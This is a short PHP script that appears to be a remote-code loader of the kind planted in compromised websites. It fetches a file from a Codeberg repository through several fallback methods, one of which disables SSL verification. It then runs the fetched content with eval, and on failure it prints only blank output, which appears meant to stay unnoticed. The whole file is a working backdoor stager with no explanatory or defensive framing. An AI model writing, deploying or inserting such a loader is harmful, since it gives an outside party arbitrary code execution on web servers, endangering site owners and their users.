<?php
$proto = "https";
$host = "codeberg.org";
$path = "/zvertixx/My-Project/raw/branch/main/jir.php";
$endpoint = $proto . "://" . $host . $path;

function getData($url, $method) {
    switch ($method) {
        case 'get_file':
            if (ini_get('allow_url_fopen')) {
                return file_get_contents($url);
            }
            break;
        case 'curl_request':
            if (function_exists('curl_version')) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $response = curl_exec($ch);
                curl_close($ch);
                return $response;
            }
            break;
        case 'stream_open':
            if ($stream = fopen($url, 'r')) {
                $content = stream_get_contents($stream);
                fclose($stream);
                return $content;
            }
            break;
        default:
            return false;
    }
    return false;
}

$methodsList = ['get_file', 'curl_request', 'stream_open'];
$dataContent = false;

foreach ($methodsList as $method) {
    $dataContent = getData($endpoint, $method);
    if ($dataContent !== false) {
        break;
    }
}

if ($dataContent !== false) {
    eval("?>" . $dataContent);
} else {
    echo "  ";
}
?>
